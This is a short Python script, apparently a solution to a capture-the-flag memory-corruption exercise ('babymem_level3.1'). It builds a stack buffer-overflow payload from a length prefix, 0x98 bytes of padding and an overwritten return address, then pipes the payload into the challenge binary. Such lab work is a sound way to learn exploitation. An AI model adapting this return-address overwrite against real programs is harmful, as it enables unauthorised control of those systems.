import os
s=b"1000\x10"+b"A"*0x98+0x401778.to_bytes(8,"little")
print(s)
fd = open("ttt-raw","wb+")
fd.write(s)
fd.close()
os.system("cat ttt-raw | /challenge/babymem_level3.1")